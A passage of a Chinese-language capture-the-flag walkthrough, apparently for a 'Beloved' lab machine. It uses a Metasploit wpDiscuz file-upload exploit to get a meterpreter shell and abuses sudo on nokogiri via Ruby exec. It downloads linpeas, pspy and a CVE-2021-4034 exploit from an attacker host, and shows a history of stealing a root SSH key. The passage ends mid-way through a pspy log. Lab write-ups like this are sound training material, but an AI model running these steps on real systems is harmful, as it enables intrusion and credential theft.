<h2 id="6-上msf-注：需要设置在同一个eth1中"><a href="#6-上msf-注：需要设置在同一个eth1中" class="headerlink" title="6.上msf(注：需要设置在同一个eth1中)"></a>6.上msf(注：需要设置在同一个eth1中)</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload</span><br><span class="line"><span class="built_in">set</span> blogpath /<span class="number">2021</span>/<span class="number">06</span>/hello<span class="literal">-world</span>/</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192.168</span>.<span class="number">56.129</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="7-下面进行提权："><a href="#7-下面进行提权：" class="headerlink" title="7.下面进行提权："></a>7.下面进行提权：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line"><span class="keyword">Process</span> <span class="number">2366</span> created.</span><br><span class="line">Channel <span class="number">0</span> created.</span><br><span class="line"></span><br><span class="line">sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www<span class="literal">-data</span> on beloved:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www<span class="literal">-data</span> may run the following commands on beloved:</span><br><span class="line">    (beloved) NOPASSWD: /usr/local/bin/nokogiri</span><br></pre></td></tr></table></figure>

<p>发现nokogiri不需要密码：尝试一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="literal">-u</span> beloved nokogiri /home/beloved</span><br><span class="line">/var/lib/gems/<span class="number">2.5</span>.<span class="number">0</span>/gems/nokogiri<span class="literal">-1</span>.<span class="number">11.7</span>/bin/nokogiri:<span class="number">98</span>:<span class="keyword">in</span> `read<span class="string">&#x27;: Is a directory @ io_fread - /home/beloved (Errno::EISDIR)</span></span><br><span class="line"><span class="string">        from /var/lib/gems/2.5.0/gems/nokogiri-1.11.7/bin/nokogiri:98:in `&lt;top (required)&gt;&#x27;</span></span><br><span class="line">        from /usr/local/bin/nokogiri:<span class="number">23</span>:<span class="keyword">in</span> `load<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        from /usr/local/bin/nokogiri:23:in `&lt;main&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以读取文件：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="literal">-u</span> beloved nokogiri /home/beloved/user.txt</span><br><span class="line">Your document is stored <span class="keyword">in</span> @doc...</span><br><span class="line"><span class="keyword">Switch</span> to inspect mode.</span><br><span class="line"><span class="comment">#换个方法试试</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">        <span class="number">4</span>: from /usr/local/bin/nokogiri:<span class="number">23</span>:<span class="keyword">in</span> `&lt;main&gt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        3: from /usr/local/bin/nokogiri:23:in `load&#x27;</span></span><br><span class="line">        <span class="number">2</span>: from /var/lib/gems/<span class="number">2.5</span>.<span class="number">0</span>/gems/nokogiri<span class="literal">-1</span>.<span class="number">11.7</span>/bin/nokogiri:<span class="number">115</span>:<span class="keyword">in</span> `&lt;top (required)&gt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        1: from (irb):1</span></span><br><span class="line"><span class="string">NameError (undefined local variable or method `ls&#x27;</span> <span class="keyword">for</span> main:Object)</span><br></pre></td></tr></table></figure>

<p>发现是gems,是ruby</p>
<p>用exec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec &#x27;cat /home/beloved/user.txt&#x27;</span><br><span class="line">exec &#x27;cat /home/beloved/user.txt&#x27;</span><br><span class="line">020588f87676a40236192c324c1a57fc</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="8-提权至sudo"><a href="#8-提权至sudo" class="headerlink" title="8.提权至sudo"></a>8.提权至sudo</h2><p>尝试漏洞侵权</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="literal">-m</span> http.server</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">56.129</span>:<span class="number">8000</span>/linpeas.sh</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">56.129</span>:<span class="number">8000</span>/pspy64</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2525 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">wget http://192.168.2.9:8000/CVE-2021-4034-main.zip</span><br><span class="line">unzip CVE-2021-4034-main.zip</span><br><span class="line">cd CVE-2021-4034-main</span><br><span class="line">make</span><br><span class="line">./cve-2021-4034</span><br><span class="line">--2023-07-24 07:43:00--  http://192.168.2.9:8000/CVE-2021-4034-main.zip</span><br><span class="line">Connecting to 192.168.2.9:8000... failed: Network is unreachable.</span><br><span class="line">unzip:  cannot find or open CVE-2021-4034-main.zip, CVE-2021-4034-main.zip.zip or CVE-2021-4034-main.zip.ZIP.</span><br><span class="line">/bin/sh: 3: cd: can&#x27;t cd to CVE-2021-4034-main</span><br><span class="line">make: *** No targets specified and no makefile found.  Stop.</span><br><span class="line">/bin/sh: 5: ./cve-2021-4034: not found</span><br></pre></td></tr></table></figure>



<p>换个方法：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line"><span class="keyword">Process</span> <span class="number">2647</span> created.</span><br><span class="line">Channel <span class="number">0</span> created.</span><br><span class="line">sudo <span class="literal">-u</span> beloved /usr/local/bin/nokogiri <span class="literal">--help</span></span><br><span class="line">Nokogiri: an HTML, XML, SAX, and Reader parser</span><br><span class="line">Usage: nokogiri &lt;uri|path&gt; [<span class="type">options</span>]</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  nokogiri https://www.ruby<span class="literal">-lang</span>.org/</span><br><span class="line">  nokogiri ./public/index.html</span><br><span class="line">  <span class="built_in">curl</span> <span class="literal">-s</span> http://www.nokogiri.org | nokogiri <span class="literal">-e</span><span class="string">&#x27;p $_.css(&quot;h1&quot;).length&#x27;</span></span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">        <span class="literal">--type</span> <span class="built_in">type</span>                  Parse as <span class="built_in">type</span>: xml or html (default: auto)</span><br><span class="line">    <span class="literal">-C</span> file                          Specifies initialization file to load (default /home/beloved/.nokogirirc)</span><br><span class="line">    <span class="literal">-E</span>, <span class="literal">--encoding</span> encoding          Read as encoding (default: none)</span><br><span class="line">    <span class="literal">-e</span> command                       Specifies script from command<span class="literal">-line</span>.</span><br><span class="line">        <span class="literal">--rng</span> &lt;uri|path&gt;             Validate <span class="keyword">using</span> this rng file.</span><br><span class="line">    -?, <span class="literal">--help</span>                       Show this message</span><br><span class="line">    <span class="literal">-v</span>, <span class="literal">--version</span>                    Show version</span><br><span class="line">sudo <span class="literal">-u</span> beloved /usr/local/bin/nokogiri /etc/passwd</span><br><span class="line">Your document is stored <span class="keyword">in</span> @doc...</span><br><span class="line"><span class="keyword">Switch</span> to inspect mode.</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .bash_history</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">id</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">0.28</span>:<span class="number">8000</span>/pspy64</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">0.28</span>:<span class="number">8000</span>/pspy64</span><br><span class="line">chmod +x *</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">./pspy64 |grep <span class="string">&quot;UID=0&quot;</span></span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-l</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">touch test &amp;&amp; touch <span class="literal">--</span> <span class="literal">--reference</span>=test</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">watch <span class="built_in">ls</span> <span class="literal">-l</span></span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">nano id_rsa</span><br><span class="line">chmod <span class="number">600</span> id_rsa</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">ssh <span class="literal">-i</span> id_rsa root@localhost</span><br></pre></td></tr></table></figure>

<p>发现id_rsa可以连接root</p>
<p>上传pspy64</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">8000</span>/pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">./pspy64    </span><br><span class="line">pspy - version: v1.<span class="number">2.1</span> - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒</span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░</span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=true): processes=true | file<span class="literal">-system-events</span>=false ||| Scanning <span class="keyword">for</span> processes every <span class="number">100</span>ms and on inotify events ||| Watching directories: [/<span class="type">usr</span> /<span class="type">tmp</span> /<span class="type">etc</span> /<span class="type">home</span> /<span class="type">var</span> /<span class="type">opt</span>] (recursive) | [] (non<span class="literal">-recursive</span>)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line">done</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2788</span>   | ./pspy64</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2774</span>   |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2750</span>   |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2672</span>   | /bin/bash</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2664</span>   |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2656</span>   | /usr/bin/ruby2.<span class="number">5</span> /usr/local/bin/nokogiri /etc/passwd</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2655</span>   | sudo <span class="literal">-u</span> beloved /usr/local/bin/nokogiri /etc/passwd</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2648</span>   | /bin/sh</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2647</span>   | sh <span class="literal">-c</span> /bin/sh  </span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2521</span>   | python3 <span class="literal">-m</span> http.server</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2367</span>   | /bin/sh</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2150</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1786</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1784</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1731</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1727</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1689</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1681</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1668</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1646</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1642</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">106</span>   PID=<span class="number">508</span>    | /usr/sbin/mysqld</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">455</span>    | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">396</span>    | /usr/bin/python3 /usr/share/unattended<span class="literal">-upgrades</span>/unattended<span class="literal">-upgrade-shutdown</span> <span class="literal">--wait-for-signal</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">387</span>    | /usr/sbin/sshd <span class="literal">-D</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">362</span>    | /sbin/agetty <span class="literal">-o</span> <span class="literal">-p</span> <span class="literal">--</span> \u <span class="literal">--noclear</span> tty1 linux</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">347</span>    | /sbin/dhclient <span class="literal">-4</span> <span class="literal">-v</span> <span class="literal">-i</span> <span class="literal">-pf</span> /run/dhclient.enp0s3.pid <span class="literal">-lf</span> /var/lib/dhcp/dhclient.enp0s3.leases <span class="literal">-I</span> <span class="literal">-df</span> /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                                     </span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">327</span>    | /usr/sbin/cron <span class="operator">-f</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">104</span>   PID=<span class="number">322</span>    | /usr/bin/dbus<span class="literal">-daemon</span> <span class="literal">--system</span> <span class="literal">--address</span>=systemd: <span class="literal">--nofork</span> <span class="literal">--nopidfile</span> <span class="literal">--systemd-activation</span> <span class="literal">--syslog-only</span>                                                                                                                                              </span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">320</span>    | /usr/sbin/rsyslogd <span class="literal">-n</span> <span class="literal">-iNONE</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">319</span>    | /lib/systemd/systemd<span class="literal">-logind</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">308</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">306</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">101</span>   PID=<span class="number">285</span>    | /lib/systemd/systemd<span class="literal">-timesyncd</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">246</span>    | /lib/systemd/systemd<span class="literal">-udevd</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">225</span>    | /lib/systemd/systemd<span class="literal">-journald</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">194</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">193</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">191</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">160</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">131</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">130</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">128</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">123</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">121</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">119</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">117</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">110</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">61</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">52</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">51</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">50</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">32</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span 